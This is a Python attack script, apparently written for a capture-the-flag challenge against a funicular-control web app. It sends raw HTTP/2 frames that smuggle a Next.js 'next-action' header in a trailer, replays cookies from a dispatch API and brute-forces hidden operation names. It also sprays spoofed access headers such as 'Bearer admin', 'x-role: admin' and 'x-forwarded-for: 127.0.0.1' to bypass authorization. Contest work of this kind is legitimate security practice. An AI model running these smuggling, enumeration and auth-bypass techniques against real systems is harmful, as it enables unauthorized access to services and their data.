#!/usr/bin/env python3
"""
probe33: two-step. Try: dispatch maintenance-preview FIRST (sets cookie/state),
then call recoveryAction WITH same cookie. Maybe dispatch establishes session
state even though it returns 502 PLC down.

Also: compare dispatch headers/body for all 3 operations carefully.
Also: brute force hidden 4th operation.
"""
import socket
import ssl
import struct
import time
import re
import json
import urllib.request
import urllib.error
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def call_action_with_cookie(body_bytes, cookie=None, content_type="text/plain;charset=UTF-8", extra=None):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p33"),
    ]
    if cookie:
        headers.append(("cookie", cookie))
    if extra:
        for k, v in extra:
            headers.append((k, v))
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    sock.settimeout(15)
    buf = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
    sock.close()

    body = b""
    headers_out = []
    pos = 0
    from hpack import Decoder
    dec = Decoder()
    status = None
    while pos < len(buf):
        if len(buf) - pos < 9:
            break
        length = int.from_bytes(buf[pos:pos+3], "big")
        ftype = buf[pos+3]
        flags = buf[pos+4]
        sid_ = int.from_bytes(buf[pos+5:pos+9], "big") & 0x7fffffff
        payload = buf[pos+9:pos+9+length]
        pos += 9 + length
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                headers_out.extend(hdrs)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, headers_out, body


def extract_row1(body):
    text = body.decode("utf-8", "replace")
    m = re.search(r'^1:(\{.*?\})$', text, re.MULTILINE)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            return m.group(1)
    return None


def call_dispatch(operation, packet="south-line.2026-03-27", workOrder="WO-17-04", terminal="OP-3", cookie=None, headers=None):
    """Call /api/operator/dispatch via urllib. Return (status, headers, body)."""
    url = f"https://{HOST}/api/operator/dispatch"
    body = json.dumps({
        "operation": operation,
        "packet": packet,
        "workOrder": workOrder,
        "terminal": terminal,
    }).encode()
    req_headers = {
        "Content-Type": "application/json",
        "User-Agent": "p33",
    }
    if headers:
        req_headers.update(headers)
    if cookie:
        req_headers["Cookie"] = cookie
    req = urllib.request.Request(url, data=body, headers=req_headers, method="POST")
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=20) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        try:
            data = e.read()
        except Exception:
            data = b""
        return e.code, dict(e.headers), data


# Step 1: compare 3 operations carefully
print("\n## Step 1: Compare dispatch ops")
for op in ["plc-sync", "telemetry-snapshot", "maintenance-preview"]:
    st, hdrs, body = call_dispatch(op)
    cookie_hdr = hdrs.get("Set-Cookie", "")
    sticker = ""
    extra_hdr_keys = sorted(set(hdrs.keys()) - {"Date", "Content-Length", "Set-Cookie", "Vary", "Cache-Control", "Content-Type", "Server"})
    print(f"  {op:25s} {st} body={body[:80]!r} extra_hdrs={extra_hdr_keys}")

# Step 2: Use cookie from dispatch in action call
print("\n## Step 2: Action with cookies from dispatch")
for op in ["plc-sync", "telemetry-snapshot", "maintenance-preview"]:
    st, hdrs, body = call_dispatch(op)
    cookie_str = hdrs.get("Set-Cookie", "").split(";")[0]  # take first cookie
    if not cookie_str:
        continue
    print(f"  Cookie from {op}: {cookie_str}")
    # Now call action with this cookie
    a_st, a_hdrs, a_body = call_action_with_cookie(b'["$K1"]', cookie=cookie_str)
    row1 = extract_row1(a_body)
    print(f"    Action result: status={a_st} row1={row1}")

# Step 3: brute force hidden ops
print("\n## Step 3: Hidden operation brute-force")
HIDDEN_OPS = [
    "restore", "recovery", "reset", "backup-restore", "plc-restore", "plc-recovery",
    "diagnostic", "diagnostics", "service", "admin", "maintenance",
    "verify", "validate", "authorize", "authenticate", "auth",
    "preview", "snapshot", "telemetry", "sync", "ping",
    "regulator-check", "regulatory-check", "regulatory-packet",
    "service-gateway", "gateway", "operator", "operator-auth",
    "regulatory", "regulatory-preview", "data-preview",
    "engineer-mode", "service-mode", "rescue",
    "session-start", "session-init", "init", "start",
    "RESTORE", "Restore",  # case-sensitive variations
    "p", "r", "m", "t", "x",  # short
    "1", "0", "2", "3",
]
distinct = {}
for op in HIDDEN_OPS:
    st, hdrs, body = call_dispatch(op)
    sig = (st, len(body), body[:50])
    distinct.setdefault(sig, []).append(op)
    if "service" in op or "gateway" in op or "auth" in op or "restore" in op or "recovery" in op:
        print(f"  {op:30s} {st} body={body[:80]!r}")
    time.sleep(0.3)

print("\n  # Distinct dispatch responses:")
for sig, ops in distinct.items():
    st, ln, prev = sig
    print(f"    [{st}] len={ln} preview={prev!r}: {ops[:5]}{' ... +%d more' % (len(ops)-5) if len(ops) > 5 else ''}")

# Step 4: action with various Origin/Referer/Authorization headers
print("\n## Step 4: Action with auth/origin headers")
TRY_HEADERS = [
    [("origin", f"https://{HOST}")],
    [("referer", f"https://{HOST}/")],
    [("origin", f"https://{HOST}"), ("referer", f"https://{HOST}/")],
    [("authorization", "Bearer admin")],
    [("authorization", "Bearer engineer")],
    [("x-engineer", "true")],
    [("x-admin", "true")],
    [("x-role", "operator")],
    [("x-role", "engineer")],
    [("x-role", "admin")],
    [("x-service-gateway", "ok")],
    [("x-recovery-token", "valid")],
    [("x-forwarded-for", "127.0.0.1")],
    [("x-forwarded-for", "10.0.0.1")],
    [("x-real-ip", "127.0.0.1")],
    [("x-internal", "true")],
]
for hdrs in TRY_HEADERS:
    st, _, body = call_action_with_cookie(b'["$K1"]', extra=hdrs)
    row1 = extract_row1(body)
    err = row1.get("error") if isinstance(row1, dict) else None
    msg = row1.get("message", "")[:50] if isinstance(row1, dict) else None
    label = ",".join(f"{k}={v[:20]}" for k, v in hdrs)
    print(f"  {label[:60]:60s} st={st} err={err} msg={msg!r}")

print("\n# done.")
